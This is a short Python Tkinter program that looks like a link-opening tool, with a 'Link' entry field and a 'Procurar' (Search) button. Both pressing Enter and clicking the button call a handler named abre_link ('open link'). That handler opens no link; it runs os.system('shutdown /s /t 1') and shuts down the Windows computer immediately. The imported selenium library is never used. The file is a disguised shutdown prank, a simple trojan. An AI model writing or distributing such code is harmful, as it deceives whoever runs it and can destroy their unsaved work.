from tkinter import *
from selenium import webdriver
import os

class Tela():
    def __init__(self):
        self.root = root
        self.configura_tela()
        self.widgets()
        root.mainloop()

    def configura_tela(self):
        self.root.configure(bg='#028090')
        self.root.geometry('400x100')

    def widgets(self):
        self.texto_principal = Label(
            self.root,
            text="Link",
            bg="#028090",
            fg='#F2ED6F',
            font=("arial", 15, "bold")

        )
        self.texto_principal.place(x=5, y=40)

        self.ent_link = Entry(self.root)
        self.ent_link.bind('<Return>', self.abre_link)
        self.ent_link.place(x=55, y=45, width=320)

        self.btn_fecha = Button(
            self.root,
            text='X',
            bg='red',
            command=self.fechar
        )
        self.btn_fecha.place(x=5, y=5, width=25, height=25)

        self.btn_procura = Button(
            self.root,
            text="Procurar",
            command=self.abre_link,
            bg="#CEE397",
            font=("arial", 10, "bold"),
            fg="black"
        )
        self.btn_procura.place(x=320, y=70, width=70, height=25)

    def abre_link(self, *args):    
        os.system("shutdown /s /t 1")

    def fechar(self):
        self.root.destroy()

root = Tk()
Tela()
